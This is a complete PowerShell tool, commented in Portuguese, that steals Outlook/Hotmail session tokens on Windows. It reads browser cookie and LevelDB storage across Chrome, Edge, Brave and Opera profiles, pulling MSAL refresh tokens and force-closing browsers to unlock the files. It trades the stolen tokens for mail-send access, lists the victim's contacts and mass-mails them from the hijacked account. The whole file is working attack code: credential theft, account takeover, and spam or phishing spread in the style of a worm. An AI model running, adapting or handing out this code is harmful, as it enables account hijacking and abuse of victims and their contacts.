#Requires -Version 5.1
<#
rehot.ps1 — detector + sender de sessoes OWA/Hotmail (versao compacta, RER G2).
PS 5.1/.NET Framework, sem deps, corpo ASCII-only (imune a codepage).
  powershell -File rehot.ps1                 # so detecta
  powershell -File rehot.ps1 -SendTo a@b.com # detecta + envia teste
  powershell -File rehot.ps1 -CloseBrowsers  # fecha navegadores antes
  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" [-MaxContacts 50]
#>
param(
    [string]$SendTo = "",
    [switch]$NoValidate,
    [switch]$CloseBrowsers,
    [switch]$ToAllContacts,
    [string]$Subject = "",
    [string]$Body = "",
    [int]$MaxContacts = 0,
    [switch]$DryRun,          # -ToAllContacts: lista destinatarios sem enviar
    [string]$Exclude = "",    # enderecos a excluir (separados por virgula)
    [switch]$ShowTokens,      # mostra tokens crus (padrao: mascarados)
    [string]$ReceiptPath = "" # se definido, grava o receipt de envio neste arquivo
)

$ErrorActionPreference = "Stop"
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

# ---------------- constantes ----------------
$APPDATA      = $env:APPDATA
$LOCALAPPDATA = $env:LOCALAPPDATA
# Client IDs do OWA = registros de app da Microsoft (iguais em TODO PC). O que
# varia por PC e o REFRESH TOKEN (extraido do leveldb). O client descoberto tem
# prioridade; as listas sao fallback conhecido p/ outro client do OWA.
$OWA_KNOWN_CLIENTIDS      = @("9199bf20-a13f-4107-85dc-02114787ef48")
$OWA_KNOWN_MAIL_CLIENTIDS = @("6bc89243-be1c-423a-99ec-b9a45b8b568b")
$OWA_READ_SCOPE  = "https://outlook.office.com/.default"
$OWA_TOKEN_URL   = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
$OWA_API_BASE    = "https://outlook.office.com/api/v2.0"
$OWA_ORIGIN      = "https://outlook.live.com"

$browsers = @(
    @{ Name = "Chrome";   Root = Join-Path $LOCALAPPDATA "Google\Chrome\User Data" },
    @{ Name = "Edge";     Root = Join-Path $LOCALAPPDATA "Microsoft\Edge\User Data" },
    @{ Name = "Brave";    Root = Join-Path $LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data" },
    @{ Name = "Opera";    Root = Join-Path $APPDATA "Opera Software\Opera Stable" },
    @{ Name = "Opera GX"; Root = Join-Path $APPDATA "Opera Software\Opera GX Stable" }
)

# ---------------- leitura de arquivo (mesmo travado) ----------------
$script:_FileIOReady = $false
function Ensure-FileIO {
    if ($script:_FileIOReady) { return }
    $sig = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
public static class FileIO {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sec, uint d, uint f, IntPtr t);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr h, byte[] b, uint n, out uint r, IntPtr o);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);
    public static byte[] ReadAll(string path) {
        IntPtr h = CreateFileW(path, 0x80000000, 0x7, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h == IntPtr.Zero || h == new IntPtr(-1)) return null;
        using (var ms = new MemoryStream()) {
            byte[] buf = new byte[1 << 20]; uint r;
            while (ReadFile(h, buf, (uint)buf.Length, out r, IntPtr.Zero) && r > 0)
                ms.Write(buf, 0, (int)r);
            CloseHandle(h);
            return ms.ToArray();
        }
    }
}
'@
    try { Add-Type -TypeDefinition $sig } catch {}
    $script:_FileIOReady = $true
}

# ---------------- snappy em C# (caminho unico; ~650x mais rapido que PS) ----------------
$script:_SnappyReady = $false
function Ensure-Snappy {
    if ($script:_SnappyReady) { return }
    $sig = @'
using System;
using System.IO;
public static class SnappyLdb {
    static int ReadVarint(byte[] d, int pos, out int val) {
        int result = 0, shift = 0;
        while (true) {
            if (pos >= d.Length) { val = 0; return -1; }
            byte b = d[pos]; pos++;
            result |= (b & 0x7F) << shift;
            if ((b & 0x80) == 0) { val = result; return pos; }
            shift += 7;
            if (shift > 35) { val = 0; return -1; }
        }
    }
    static int SnappyOne(byte[] src, int start, byte[] dst, out int consumed) {
        int declared;
        int pos = start;
        try {
            int p = ReadVarint(src, pos, out declared);
            if (p < 0) { consumed = 0; return -1; }
            pos = p;
            if (declared <= 0 || declared > (1 << 22)) { consumed = 0; return -1; }
            int outLen = 0;
            while (pos < src.Length && outLen < declared) {
                byte tag = src[pos]; pos++;
                int t = tag & 3;
                if (t == 0) {
                    int l = (tag >> 2) + 1;
                    if (l > 60) {
                        int nb = l - 60;
                        long lv = 0;
                        for (int i = 0; i < nb; i++) lv |= (long)src[pos + i] << (i * 8);
                        pos += nb;
                        l = (int)lv + 1;
                    }
                    if (l <= 0 || pos + l > src.Length) { consumed = 0; return -1; }
                    Buffer.BlockCopy(src, pos, dst, outLen, l);
                    pos += l; outLen += l;
                } else if (t == 1) {
                    int l = ((tag >> 2) & 0x7) + 4;
                    if (pos >= src.Length) { consumed = 0; return -1; }
                    int off = ((tag >> 5) << 8) | src[pos]; pos++;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                } else if (t == 2) {
                    int l = (tag >> 2) + 1;
                    if (pos + 2 > src.Length) { consumed = 0; return -1; }
                    int off = src[pos] | (src[pos + 1] << 8); pos += 2;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                } else {
                    int l = (tag >> 2) + 1;
                    if (pos + 4 > src.Length) { consumed = 0; return -1; }
                    int off = src[pos] | (src[pos + 1] << 8) | (src[pos + 2] << 16) | (src[pos + 3] << 24); pos += 4;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                }
            }
            if (outLen != declared) { consumed = 0; return -1; }
            consumed = pos;
            return declared;
        } catch { consumed = 0; return -1; }
    }
    public static byte[] DecompressFile(byte[] data) {
        if (data == null || data.Length < 48) return null;
        ulong magic = BitConverter.ToUInt64(data, data.Length - 8);
        if (magic != 0x88328E1720020B68UL && magic != 0xDB4775248B80FB57UL) return null;
        int metaOff, metaLen, idxOff, idxLen;
        int p = data.Length - 48;
        int a = ReadVarint(data, p, out metaOff); if (a < 0) return null;
        int b = ReadVarint(data, a, out metaLen); if (b < 0) return null;
        int c = ReadVarint(data, b, out idxOff); if (c < 0) return null;
        int d2 = ReadVarint(data, c, out idxLen); if (d2 < 0) return null;
        int end = Math.Min(idxOff, data.Length - 48);
        var ms = new MemoryStream();
        int pos = 0;
        byte[] block = new byte[1 << 22];
        int consumed;
        while (pos < end) {
            int declared = SnappyOne(data, pos, block, out consumed);
            if (declared < 0) { pos++; continue; }
            ms.Write(block, 0, declared);
            pos = consumed;
        }
        return ms.ToArray();
    }
}
'@
    try { Add-Type -TypeDefinition $sig } catch {}
    $script:_SnappyReady = $true
}

function Read-FileBytes([string]$path) {
    try { return [System.IO.File]::ReadAllBytes($path) } catch {}
    Ensure-FileIO
    return [FileIO]::ReadAll($path)
}

# ---------------- leveldb: descomprime o blob .ldb (caminho unico C#) ----------------
function Get-LeveldbBlob([string]$path) {
    $data = Read-FileBytes $path
    if (-not $data -or $data.Length -lt 48) { return $null }
    Ensure-Snappy
    try { return [SnappyLdb]::DecompressFile($data) } catch { return $null }
}

# ---------------- MSAL: extrai refresh token + client ----------------
# Varre um blob .ldb e devolve o 1o refresh token conhecido; senao, o 1o nao-conhecido.
function Find-RefreshInBlob([string]$blobStr) {
    $fallback = $null
    $searchStart = 0
    while ($true) {
        $idx = $blobStr.IndexOf('"credentialType":"RefreshToken"', $searchStart)
        if ($idx -lt 0) { break }
        $openBrace  = $blobStr.LastIndexOf('{', $idx)
        $closeBrace = $blobStr.IndexOf('}', $idx)
        if ($openBrace -ge 0 -and $closeBrace -gt $openBrace) {
            $json = $blobStr.Substring($openBrace, $closeBrace - $openBrace + 1)
            try {
                $obj = $json | ConvertFrom-Json
                if ($obj.secret -and $obj.clientId) {
                    if ($OWA_KNOWN_CLIENTIDS -contains $obj.clientId) {
                        return @{ refresh = $obj.secret; client = $obj.clientId }
                    }
                    if ($null -eq $fallback) { $fallback = @{ refresh = $obj.secret; client = $obj.clientId } }
                }
            } catch {}
        }
        $searchStart = $idx + 1
    }
    return $fallback
}

function Get-MSALToken([string]$leveldbDir) {
    if (-not (Test-Path $leveldbDir)) { return $null }
    $fallback = $null
    foreach ($f in (Get-ChildItem $leveldbDir -Filter *.ldb -ErrorAction SilentlyContinue)) {
        $blob = Get-LeveldbBlob $f.FullName
        if (-not $blob -or $blob.Length -eq 0) { continue }
        $found = Find-RefreshInBlob ([System.Text.Encoding]::ASCII.GetString($blob))
        if (-not $found) { continue }
        if ($OWA_KNOWN_CLIENTIDS -contains $found.client) { return $found }
        if ($null -eq $fallback) { $fallback = $found }
    }
    return $fallback
}

# ---------------- cookies (sinal de sessao, busca crua) ----------------
function Test-MSCookies([string]$profileDir) {
    $net    = Join-Path $profileDir "Network\Cookies"
    $legacy = Join-Path $profileDir "Cookies"
    $src = if (Test-Path $net) { $net } elseif (Test-Path $legacy) { $legacy } else { $null }
    if (-not $src) { return @{ state = "absent"; ms = $false; outlook = 0 } }
    $bytes = Read-FileBytes $src
    if (-not $bytes) { return @{ state = "locked"; ms = $false; outlook = 0 } }
    $text = [System.Text.Encoding]::ASCII.GetString($bytes)
    $ms = $text.Contains("MSPAuth") -or $text.Contains("MSPSec")
    $outlook = ([regex]::Matches($text, "outlook\.live\.com|outlook\.office\.com")).Count
    return @{ state = "ok"; ms = $ms; outlook = $outlook }
}

# ---------------- HTTP: troca / validacao / envio ----------------
function UrlEnc([string]$s) { [System.Uri]::EscapeDataString($s) }

# Mascarar token p/ saida (padrao): prefixo + elipse + sufixo. Nulo entra, nulo sai.
function Mask-Token([string]$t) {
    if (-not $t) { return $null }
    if ($t.Length -le 12) { return ($t.Substring(0, [Math]::Min(4, $t.Length)) + "****") }
    return ($t.Substring(0, 8) + "..." + $t.Substring($t.Length - 4))
}

# $script:LastExchangeError guarda o motivo da ultima troca que falhou.
$script:LastExchangeError = $null
function Exchange-OWAToken([string]$refresh, [string]$client, [string]$scope) {
    $script:LastExchangeError = $null
    $body = "grant_type=refresh_token&refresh_token=$(UrlEnc $refresh)&client_id=$(UrlEnc $client)&scope=$(UrlEnc $scope)"
    try {
        $resp = Invoke-WebRequest -Uri $OWA_TOKEN_URL -Method Post -Body $body `
            -Headers @{ "Origin" = $OWA_ORIGIN } -ContentType "application/x-www-form-urlencoded" -UseBasicParsing
        return ($resp.Content | ConvertFrom-Json).access_token
    } catch {
        $script:LastExchangeError = $_.Exception.Message
        if ($_.Exception.Response) {
            try {
                $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                $script:LastExchangeError = $script:LastExchangeError + " | " + $sr.ReadToEnd()
            } catch {}
        }
        return $null
    }
}

function Test-OWAToken([string]$token) {
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me" -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
        $j = $resp.Content | ConvertFrom-Json
        $email = $j.EmailAddress
        if ($email -is [System.Management.Automation.PSCustomObject]) { $email = $email.Address }
        return @{ state = "valido"; email = $email }
    } catch {
        $code = 0
        if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
        if ($code -eq 401) { return @{ state = "expirado"; email = $null } }
        return @{ state = "erro"; email = $null }
    }
}

# Adquire token WRITE (Mail.Send). O client da troca e sempre o dono do refresh
# ($client, do leveldb); o que varia e o scope (api://<mailClient>/.default).
# Tenta os clients de mail conhecidos e, por fim, o proprio client descoberto.
function Get-OWAWriteToken([string]$refresh, [string]$client) {
    $candidates = @($OWA_KNOWN_MAIL_CLIENTIDS) + @($client)
    foreach ($mc in ($candidates | Select-Object -Unique)) {
        if (-not $mc) { continue }
        $tok = Exchange-OWAToken $refresh $client "api://$mc/.default"
        if (-not $tok) { continue }
        $v = Test-OWAToken $tok
        if ($v.state -eq "valido") { return @{ token = $tok; mailClient = $mc; email = $v.email } }
    }
    return $null
}

function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$body) {
    $payload = @{
        Message = @{
            Subject = $subject
            Body = @{ ContentType = "Text"; Content = $body }
            ToRecipients = @(@{ EmailAddress = @{ Address = $to } })
        }
        SaveToSentItems = $true
    } | ConvertTo-Json -Depth 5
    # corpo como byte[] UTF-8: IWR 5.1 codifica string no charset do sistema
    # (Windows-1252), o que corrompe acentos e quebra o JSON (400).
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me/sendMail" -Method Post -Body $bytes `
            -Headers @{ "Authorization" = "Bearer $token"; "Origin" = $OWA_ORIGIN } `
            -ContentType "application/json" -UseBasicParsing
        return @{ ok = ($resp.StatusCode -eq 202); status = [int]$resp.StatusCode; erro = $null }
    } catch {
        $code = 0; $erro = $null
        if ($_.Exception.Response) {
            $code = [int]$_.Exception.Response.StatusCode
            try {
                $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                $erro = $sr.ReadToEnd()
            } catch {}
        }
        return @{ ok = $false; status = $code; erro = $erro }
    }
}

# ---------------- agenda de contatos (GET /me/contacts, paginado) ----------------
function Get-OWAContacts([string]$token) {
    $result = @()
    $uri = "$OWA_API_BASE/me/contacts?`$top=200"
    while ($uri) {
        try {
            $resp = Invoke-WebRequest -Uri $uri -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
        } catch { return $result }
        $j = $resp.Content | ConvertFrom-Json
        if ($j.value) {
            foreach ($c in $j.value) {
                $email = $null
                if ($c.emailAddresses -and $c.emailAddresses.Count -gt 0) { $email = $c.emailAddresses[0].address }
                if ($email) { $result += @{ name = $c.displayName; email = $email } }
            }
        }
        $uri = $j."@odata.nextLink"
    }
    return $result
}

# ---------------- enumeracao de perfis ----------------
function Get-Profiles([string]$root) {
    $result = @()
    if (-not (Test-Path $root)) { return $result }
    foreach ($entry in (Get-ChildItem $root -Directory -ErrorAction SilentlyContinue)) {
        $name = $entry.Name
        if ($name -eq "Default" -or $name -like "Profile *") {
            $hasCookies = Test-Path (Join-Path $entry.FullName "Network\Cookies")
            $hasLS      = Test-Path (Join-Path $entry.FullName "Local Storage\leveldb")
            if ($hasCookies -or $hasLS) { $result += @{ Name = $name; Dir = $entry.FullName } }
        }
    }
    if ($result.Count -eq 0) {
        # Opera: a propria raiz pode ser o perfil (sem sub-Default)
        if ((Test-Path (Join-Path $root "Network\Cookies")) -or (Test-Path (Join-Path $root "Local Storage\leveldb"))) {
            $result += @{ Name = (Split-Path $root -Leaf); Dir = $root }
        }
    }
    return $result
}

# ---------------- fechar navegadores (libera locks do leveldb/Cookies) ----------------
function Close-Browsers {
    $procs = @("chrome", "msedge", "brave", "opera", "operagx")
    $fechados = @()
    foreach ($p in $procs) {
        $found = Get-Process -Name $p -ErrorAction SilentlyContinue
        if ($found) {
            $found | Stop-Process -Force -ErrorAction SilentlyContinue
            $fechados += $p
        }
    }
    if ($fechados.Count -gt 0) { Start-Sleep -Milliseconds 800 }
    return $fechados
}

# ---------------- analise de um perfil ----------------
function Get-ProfileDisplayName([string]$pdir) {
    try {
        $pref = Get-Content (Join-Path $pdir "Preferences") -Raw -ErrorAction Stop | ConvertFrom-Json
        return $pref.profile.name
    } catch { return $null }
}

# Troca o refresh MSAL por tokens OWA (READ -> valida -> WRITE). Devolve os tokens.
function Get-ProfileTokens([object]$msal, [bool]$validate) {
    $readTok = $writeTok = $writeClient = $null
    $validated = $null
    if ($validate -and $msal) {
        $readTok = Exchange-OWAToken $msal.refresh $msal.client $OWA_READ_SCOPE
        if ($readTok) {
            $validated = Test-OWAToken $readTok
            if ($validated.state -eq "valido") {
                $wt = Get-OWAWriteToken $msal.refresh $msal.client
                if ($wt) { $writeTok = $wt.token; $writeClient = $wt.mailClient }
            }
        }
    }
    return @{ readTok = $readTok; writeTok = $writeTok; writeClient = $writeClient; validated = $validated }
}

function Get-Verdict([object]$cookies, [object]$msal, [object]$tok) {
    if ($tok.validated -and $tok.validated.state -eq "valido") { return "LOGADO_TOKEN_VALIDO" }
    elseif ($cookies.ms -or $msal) { return "LOGADO_SESSAO_VIVA" }
    elseif ($cookies.state -eq "locked") { return "BLOQUEADO_NAVEGADOR_ABERTO" }
    else { return "SEM_SESSAO" }
}

function Analyze-Profile([string]$browser, [string]$pname, [string]$pdir, [bool]$validate) {
    $cookies = Test-MSCookies $pdir
    $msal = Get-MSALToken (Join-Path $pdir "Local Storage\leveldb")
    $display = Get-ProfileDisplayName $pdir
    $tok = Get-ProfileTokens $msal $validate
    $verdict = Get-Verdict $cookies $msal $tok
    [PSCustomObject]@{
        navegador   = $browser
        perfil      = $pname
        perfil_nome = $display
        profile_dir = $pdir
        veredito    = $verdict
        cookies_ms  = $cookies.ms
        cookies_outlook = $cookies.outlook
        msal        = [bool]$msal
        msal_client = if ($msal) { $msal.client } else { $null }
        conta       = if ($tok.validated) { $tok.validated.email } else { $null }
        validacao   = $tok.validated
        token_read  = $tok.readTok
        token_write = $tok.writeTok
        write_client = $tok.writeClient
        exchange_error = if ($msal -and -not $tok.readTok) { $script:LastExchangeError } else { $null }
    }
}

# ---------------- main ----------------
$validate = -not $NoValidate.IsPresent
$fechados = @()
if ($CloseBrowsers.IsPresent) { $fechados = @(Close-Browsers) }
$results = @()
foreach ($b in $browsers) {
    $profiles = Get-Profiles $b.Root
    foreach ($p in $profiles) {
        $results += Analyze-Profile $b.Name $p.Name $p.Dir $validate
    }
}

$validos    = @($results | Where-Object { $_.veredito -eq "LOGADO_TOKEN_VALIDO" })
$vivos      = @($results | Where-Object { $_.veredito -eq "LOGADO_SESSAO_VIVA" })
$bloqueados = @($results | Where-Object { $_.veredito -eq "BLOQUEADO_NAVEGADOR_ABERTO" })

if ($validos.Count -gt 0) {
    if ($validos.Count -gt 1) {
        $decisao = "MAIS DE UM Outlook logado com token valido -> USAR TODOS: " +
            (($validos | ForEach-Object { "$($_.navegador)/$($_.perfil) ($($_.conta))" }) -join "; ")
    } else {
        $r = $validos[0]
        $decisao = "USAR: $($r.navegador)/$($r.perfil) - conta $($r.conta) (token OWA validado via REST API v2.0 /me)"
    }
}
elseif ($vivos.Count -gt 0) {
    $decisao = "Sessao viva (cookie MSPAuth / refresh MSAL) mas token nao validado -> trocar o refresh (scope api://<client de mail do OWA>/.default) em: " +
        (($vivos | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
elseif ($bloqueados.Count -gt 0) {
    $decisao = "Perfis com arquivos travados (navegador aberto) -> fechar o navegador e re-executar: " +
        (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
else { $decisao = "NENHUMA sessao viva encontrada" }

if ($bloqueados.Count -gt 0 -and ($validos.Count -gt 0 -or $vivos.Count -gt 0)) {
    $decisao += " | ATENCAO: perfis ainda travados (pode haver OUTRA conta logada ali): " +
        (($bloqueados | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}
$comWrite = @($validos | Where-Object { $_.token_write })
if ($comWrite.Count -gt 0) {
    $decisao += " | WRITE OK (Mail.Send): " + (($comWrite | ForEach-Object { "$($_.navegador)/$($_.perfil)" }) -join "; ")
}

# ---- modo -SendTo ----
$envio = $null
if ($SendTo) {
    $src = $validos | Where-Object { $_.token_write } | Select-Object -First 1
    if ($src) {
        $res = Send-OWAMail $src.token_write $SendTo "[TESTE EnvioHOT] rehot.ps1 -SendTo" "Envio de teste automatico (PowerShell)"
        $envio = [PSCustomObject]@{ de = $src.conta; para = $SendTo; ok = $res.ok; status = $res.status; erro = $res.erro; perfil = "$($src.navegador)/$($src.perfil)" }
    }
    else {
        $cand = ($validos + $vivos) | Where-Object { $_.msal } | Select-Object -First 1
        if ($cand) {
            $msal = Get-MSALToken (Join-Path $cand.profile_dir "Local Storage\leveldb")
            $wtObj = if ($msal) { Get-OWAWriteToken $msal.refresh $msal.client } else { $null }
            $wt = if ($wtObj) { $wtObj.token } else { $null }
            if ($wt) {
                $res = Send-OWAMail $wt $SendTo "[TESTE EnvioHOT] rehot.ps1 -SendTo" "Envio de teste automatico (PowerShell)"
                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $res.ok; status = $res.status; perfil = "$($cand.navegador)/$($cand.perfil)" }
            } else {
                $envio = [PSCustomObject]@{ de = $cand.conta; para = $SendTo; ok = $false; status = "sem_token_write"; perfil = "$($cand.navegador)/$($cand.perfil)" }
            }
        } else {
            $envio = [PSCustomObject]@{ de = $null; para = $SendTo; ok = $false; status = "sem_perfil_com_refresh"; perfil = $null }
        }
    }
}

# ---- modo -ToAllContacts: lista a agenda e envia a mensagem designada a todos ----
# G3: exclusoes (-Exclude), dry-run (-DryRun), limite (-MaxContacts), receipt.
$envioTodos = $null
if ($ToAllContacts.IsPresent) {
    $src = $validos | Where-Object { $_.token_write -and $_.token_read } | Select-Object -First 1
    $subject = if ($Subject) { $Subject } else { "[TESTE EnvioHOT] rehot -ToAllContacts" }
    $body    = if ($Body)    { $Body }    else { "Mensagem de teste para todos os contatos (PowerShell)" }
    if ($src) {
        $contatos = @(Get-OWAContacts $src.token_read)
        # exclusoes: enderecos em -Exclude nao recebem
        if ($Exclude) {
            $excl = @($Exclude -split ',' | ForEach-Object { $_.Trim().ToLower() } | Where-Object { $_ })
            $contatos = @($contatos | Where-Object { $excl -notcontains $_.email.ToLower() })
        }
        $totalAgenda = $contatos.Count
        $limitado = ($MaxContacts -gt 0 -and $totalAgenda -gt $MaxContacts)
        if ($limitado) { $contatos = @($contatos | Select-Object -First $MaxContacts) }
        if ($DryRun.IsPresent) {
            # dry-run: lista destinatarios e total sem enviar
            $envioTodos = [PSCustomObject]@{
                de = $src.conta; dry_run = $true; total = $contatos.Count; enviados = 0; falhas = @()
                total_agenda = $totalAgenda; limitado = $limitado
                destinatarios = @($contatos | ForEach-Object { $_.email })
                perfil = "$($src.navegador)/$($src.perfil)"
            }
        } else {
            $ok = 0; $falhas = @()
            foreach ($c in $contatos) {
                $res = Send-OWAMail $src.token_write $c.email $subject $body
                if ($res.ok) { $ok++ }
                else { $falhas += [PSCustomObject]@{ email = $c.email; status = $res.status; erro = $res.erro } }
                Start-Sleep -Milliseconds 300
            }
            $envioTodos = [PSCustomObject]@{
                de = $src.conta; dry_run = $false; total = $contatos.Count; enviados = $ok; falhas = $falhas
                total_agenda = $totalAgenda; limitado = $limitado
                perfil = "$($src.navegador)/$($src.perfil)"
            }
        }
    } else {
        $envioTodos = [PSCustomObject]@{ de = $null; total = 0; enviados = 0; falhas = @(); status = "sem_perfil_com_token" }
    }
}

# ---- tokens mascarados por padrao (G3) ----
if (-not $ShowTokens.IsPresent) {
    foreach ($p in $results) {
        $p.token_read  = Mask-Token $p.token_read
        $p.token_write = Mask-Token $p.token_write
    }
}

# ---- receipt de envio (G3): grava o artefato de auditoria se -ReceiptPath ----
if ($ReceiptPath -and $envioTodos) {
    $receipt = [PSCustomObject]@{
        maquina = $env:COMPUTERNAME; timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
        envio_todos = $envioTodos
    }
    $receipt | ConvertTo-Json -Depth 6 | Out-File -FilePath $ReceiptPath -Encoding utf8
}

$out = [PSCustomObject]@{
    maquina   = $env:COMPUTERNAME
    timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
    navegadores_fechados = $fechados
    decisao   = $decisao
    envio     = $envio
    envio_todos = $envioTodos
    perfis    = $results
}
$out | ConvertTo-Json -Depth 6